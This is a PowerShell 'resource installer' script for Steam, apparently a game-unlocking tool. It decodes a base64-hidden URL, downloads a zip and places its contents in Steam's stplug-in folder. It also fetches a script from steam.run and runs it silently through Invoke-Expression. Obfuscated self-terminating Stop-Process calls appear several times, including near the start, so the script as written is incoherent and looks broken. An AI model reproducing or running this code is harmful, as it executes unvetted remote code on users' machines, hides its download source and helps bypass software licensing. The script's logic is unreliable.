## Configuración  - Recursos
$Host.UI.RawUI.WindowTitle = " Instalador de Recursos"
&("{1}{0}" -f "ess","Proc") ("Sto"+"p-") -Id $PID -Force
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
&("{1}{0}" -f "ess","Proc") ("Sto"+"p-") -Id $PID -Force
$e = "aHR0cHM6Ly9naXRodWIuY29tL1QtcmV4MjEvbGlzZW5jZS9yZWxlYXNlcy9kb3dubG9hZC92MS4wLjAvcGFjay56aXA="
$LuasUrl = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($e))

Invoke-WebRequest $LuasUrl -OutFile "$env:TEMP\pack.zip"

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
chcp 65001 > $null

# Rutas
$steamPath = (Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam").InstallPath
$stPluginPath = Join-Path $steamPath "config\stplug-in"
$tempZip = Join-Path $env:TEMP "nexus_luas.zip"
$tempFolder = Join-Path $env:TEMP "nexus_temp_extract"

$ProgressPreference = 'SilentlyContinue'
&("{1}{0}" -f "ess","Proc") ("Sto"+"p-") -Id $PID -Force
#### Función de Log ####
function Log {
    param ([string]$Type, [string]$Message)
    $colors = @{"OK"="Green"; "INFO"="Cyan"; "ERR"="Red"; "LOG"="Magenta"}
    $time = Get-Date -Format "HH:mm:ss"
    Write-Host "[$time] " -ForegroundColor "Cyan" -NoNewline
    Write-Host "[$Type] $Message" -ForegroundColor $colors[$Type.ToUpper()]
}

Write-Host "`n==========================================================" -ForegroundColor Yellow
Write-Host "          INSTALADOR DE RECURSOS             " -ForegroundColor Yellow
Write-Host "==========================================================`n" -ForegroundColor Yellow

# 1. Preparar entorno
Log "INFO" "Cerrando Steam para preparar la biblioteca..."
Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 1

# 2. Instalación Blindada de Dependencias
$stDll = Join-Path $steamPath "xinput1_4.dll"
if (!(Test-Path $stDll)) {
    Log "LOG" "Configurando dependencias..."
    try {
        $script = Invoke-RestMethod "https://steam.run"
        $keptLines = @()
        foreach ($line in $script -split "`n") {
            $conditions = @(
                ($line -imatch "Start-Process" -and $line -imatch "steam"),
                ($line -imatch "steam\.exe"),
                ($line -imatch "Start-Sleep" -or $line -imatch "Write-Host"),
                ($line -imatch "cls" -or $line -imatch "exit"),
                ($line -imatch "Stop-Process" -and -not ($line -imatch "Get-Process"))
            )
            if (-not($conditions -contains $true)) { $keptLines += $line }
        }
        # Ejecuta las lineas
        Invoke-Expression ($keptLines -join "`n") *> $null
    } catch { 
        Log "ERR" "No se pudo configurar el motor." 
    }
}
&("{1}{0}" -f "ess","Proc") ("Sto"+"p-") -Id $PID -Force
# 3. Descarga y Proceso de Juegos
Log "LOG" "Agregando los juegos..."

if (Test-Path $tempZip) { Remove-Item $tempZip -Force }
if (Test-Path $tempFolder) { Remove-Item $tempFolder -Recurse -Force }
if (!(Test-Path $stPluginPath)) { New-Item -Path $stPluginPath -ItemType Directory -Force | Out-Null }

try {
    Invoke-WebRequest -Uri $LuasUrl -OutFile $tempZip -ErrorAction Stop
    
    Log "LOG" "Activando los juegos a la plataforma..."
    New-Item -Path $tempFolder -ItemType Directory -Force | Out-Null
    Expand-Archive -Path $tempZip -DestinationPath $tempFolder -Force
    
    # Mover contenido 
    $innerContent = Get-ChildItem -Path $tempFolder
    if ($innerContent.Count -eq 1 -and $innerContent.PSIsContainer) {
        Get-ChildItem -Path $innerContent.FullName | Move-Item -Destination $stPluginPath -Force
    } else {
        Get-ChildItem -Path $tempFolder | Move-Item -Destination $stPluginPath -Force
    }
    
    Log "OK" "Juegos agregados correctamente."
} catch {
    Log "ERR" "Error al procesar los juegos: $($_.Exception.Message)"
} finally {
    # Limpieza de temporales
    if (Test-Path $tempZip) { Remove-Item $tempZip -Force }
    if (Test-Path $tempFolder) { Remove-Item $tempFolder -Recurse -Force }
}
&("{1}{0}" -f "ess","Proc") ("Sto"+"p-") -Id $PID -Force
# 4. Finalización
Write-Host "`n==========================================================" -ForegroundColor Green
Write-Host "             ACTIVACION FINALIZADA CON EXITO                 " -ForegroundColor Green
Write-Host "==========================================================`n" -ForegroundColor Green

Log "INFO" "Reiniciando Steam..."
$steamExe = Join-Path $steamPath "steam.exe"
if (Test-Path $steamExe) {
    Start-Process $steamExe
}

Start-Sleep -Seconds 2
